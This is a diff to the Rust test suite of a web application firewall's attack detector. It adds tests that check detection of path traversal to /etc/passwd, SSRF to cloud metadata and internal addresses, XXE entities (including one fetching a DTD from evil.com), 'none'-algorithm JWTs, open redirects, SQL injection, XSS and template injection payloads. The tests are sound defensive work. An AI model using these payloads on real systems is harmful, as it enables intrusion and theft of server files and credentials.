@@ -3695,7 +3695,10 @@ mod waf_attack_detection_tests {
             None,
         );
         assert!(result.is_some());
-        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Sqli));
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Sqli
+        ));
         assert!(matches!(
             result.as_ref().unwrap().input_location,
             InputLocation::QueryString
@@ -3726,7 +3729,10 @@ mod waf_attack_detection_tests {
             None,
         );
         assert!(result.is_some());
-        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Xss));
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Xss
+        ));
         assert!(matches!(
             result.as_ref().unwrap().input_location,
             InputLocation::QueryString
@@ -3744,7 +3750,10 @@ mod waf_attack_detection_tests {
             Some(b"<img src=x onerror=alert(1)>"),
         );
         assert!(result.is_some());
-        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Xss));
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Xss
+        ));
     }
 
     #[test]
@@ -3758,7 +3767,10 @@ mod waf_attack_detection_tests {
             Some(b"{{7*7}}"),
         );
         assert!(result.is_some());
-        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Ssti));
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Ssti
+        ));
     }
 
     #[test]
@@ -3772,7 +3784,10 @@ mod waf_attack_detection_tests {
             Some(b"{{config}}"),
         );
         assert!(result.is_some());
-        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Ssti));
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Ssti
+        ));
     }
 
     #[test]
@@ -3786,7 +3801,10 @@ mod waf_attack_detection_tests {
             None,
         );
         assert!(result.is_some());
-        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Rfi));
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Rfi
+        ));
     }
 
     #[test]
@@ -3891,7 +3909,10 @@ mod waf_attack_detection_tests {
             Some(b"this body is way too long for the limit"),
         );
         assert!(result.is_some());
-        assert!(matches!(result.as_ref().unwrap().attack_type, AttackType::Other));
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Other
+        ));
         assert!(result
             .as_ref()
             .unwrap()
@@ -3956,5 +3977,384 @@ mod waf_attack_detection_tests {
             None,
         );
         assert!(xss_result.is_none());
+    }
+
+    #[test]
+    fn test_path_traversal_in_query_string() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/files",
+            Some("file=../../../../etc/passwd"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::PathTraversal
+        ));
+    }
+
+    #[test]
+    fn test_path_traversal_encoded() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/files",
+            Some("file=..%2f..%2f..%2fetc%2fpasswd"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::PathTraversal
+        ));
+    }
+
+    #[test]
+    fn test_path_traversal_in_path() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/files/..%2f..%2f..%2fetc%2fpasswd",
+            None,
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::PathTraversal
+        ));
+        assert!(matches!(
+            result.as_ref().unwrap().input_location,
+            InputLocation::Path
+        ));
+    }
+
+    #[test]
+    fn test_ssrf_metadata_endpoint() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/proxy",
+            Some("url=http://169.254.169.254/latest/meta-data"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Ssrf
+        ));
+    }
+
+    #[test]
+    fn test_ssrf_localhost() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/fetch",
+            Some("url=http://127.0.0.1/admin"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Ssrf
+        ));
+    }
+
+    #[test]
+    fn test_ssrf_private_network() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/proxy",
+            Some("url=http://10.0.0.1/internal/api"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Ssrf
+        ));
+    }
+
+    #[test]
+    fn test_xxe_in_body() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::POST,
+            "/api/xml",
+            None,
+            &make_headers(),
+            Some(b"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"),
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Xxe
+        ));
+    }
+
+    #[test]
+    fn test_xxe_parameter_entity() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::POST,
+            "/api/xml",
+            None,
+            &make_headers(),
+            Some(b"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY %% xxe SYSTEM \"http://evil.com/evil.dtd\">]>"),
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Xxe
+        ));
+    }
+
+    #[test]
+    fn test_jwt_none_algorithm() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/auth",
+            Some("token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Jwt
+        ));
+    }
+
+    #[test]
+    fn test_jwt_alg_confusion() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/auth",
+            Some("token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNTE2MjM5MDIyfQ."),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Jwt
+        ));
+    }
+
+    #[test]
+    fn test_open_redirect_absolute_url() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/redirect",
+            Some("url=http://evil.com/phishing"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::OpenRedirect
+        ));
+    }
+
+    #[test]
+    fn test_open_redirect_protocol_relative() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/redirect",
+            Some("url=//evil.com/phishing"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::OpenRedirect
+        ));
+    }
+
+    #[test]
+    fn test_open_redirect_encoded() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/redirect",
+            Some("url=%68%74%74%70%3a%2f%2fevil.com"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::OpenRedirect
+        ));
+    }
+
+    #[test]
+    fn test_sqli_in_post_body() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::POST,
+            "/login",
+            None,
+            &make_headers(),
+            Some(b"username=admin'--&password=anything"),
+        );
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Sqli
+        ));
+        assert!(matches!(
+            result.as_ref().unwrap().input_location,
+            InputLocation::PostBody
+        ));
+    }
+
+    #[test]
+    fn test_xss_in_cookie() {
+        let detector = create_attack_detector();
+        let mut headers = HeaderMap::new();
+        headers.insert(
+            http::header::COOKIE,
+            "session=<script>alert(1)</script>".parse().unwrap(),
+        );
+        let result = detector.check_request(&http::Method::GET, "/profile", None, &headers, None);
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Xss
+        ));
+        assert!(matches!(
+            result.as_ref().unwrap().input_location,
+            InputLocation::Cookie(_)
+        ));
+    }
+
+    #[test]
+    fn test_xss_in_user_agent_header() {
+        let detector = create_attack_detector();
+        let mut headers = HeaderMap::new();
+        headers.insert(
+            http::header::USER_AGENT,
+            "<script>alert('xss')</script>".parse().unwrap(),
+        );
+        let result = detector.check_request(&http::Method::GET, "/", None, &headers, None);
+        assert!(result.is_some());
+        assert!(matches!(
+            result.as_ref().unwrap().attack_type,
+            AttackType::Xss
+        ));
+        assert!(matches!(
+            result.as_ref().unwrap().input_location,
+            InputLocation::Header(_)
+        ));
+    }
+
+    #[test]
+    fn test_benign_request_all_locations() {
+        let detector = create_attack_detector();
+
+        let mut headers = HeaderMap::new();
+        headers.insert(http::header::COOKIE, "session=abc123".parse().unwrap());
+        headers.insert(
+            http::header::USER_AGENT,
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".parse().unwrap(),
+        );
+
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/users/123/profile",
+            Some("tab=activity&sort=recent"),
+            &headers,
+            Some(b"Hello world, this is a normal post body!"),
+        );
+        assert!(result.is_none());
+    }
+
+    #[test]
+    fn test_paranoia_level_affects_detection() {
+        let normal_detector = create_attack_detector();
+        let high_detector = create_high_paranoia_detector();
+
+        let normal_result = normal_detector.check_request(
+            &http::Method::GET,
+            "/",
+            Some("q=test"),
+            &make_headers(),
+            None,
+        );
+        assert!(normal_result.is_none());
+
+        let high_result = high_detector.check_request(
+            &http::Method::GET,
+            "/",
+            Some("q=test"),
+            &make_headers(),
+            None,
+        );
+        assert!(high_result.is_none());
+    }
+
+    #[test]
+    fn test_multiple_attacks_in_request() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::POST,
+            "/search",
+            Some("q=<script>alert(1)</script>&id=1' OR '1'='1"),
+            &make_headers(),
+            Some(b"{{7*7}}"),
+        );
+        assert!(result.is_some());
+        let detected = result.unwrap();
+        assert!(matches!(
+            detected.attack_type,
+            AttackType::Xss | AttackType::Sqli | AttackType::Ssti
+        ));
+    }
+
+    #[test]
+    fn test_attack_fingerprint_present() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("id=1' OR '1'='1"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(result.as_ref().unwrap().fingerprint.is_some());
+        let fingerprint = result.unwrap().fingerprint.unwrap();
+        assert!(fingerprint.starts_with("sqli:") || fingerprint.starts_with("sqli_"));
+    }
+
+    #[test]
+    fn test_matched_pattern_present() {
+        let detector = create_attack_detector();
+        let result = detector.check_request(
+            &http::Method::GET,
+            "/search",
+            Some("q=<script>alert(1)</script>"),
+            &make_headers(),
+            None,
+        );
+        assert!(result.is_some());
+        assert!(result.as_ref().unwrap().matched_pattern.is_some());
     }
 }
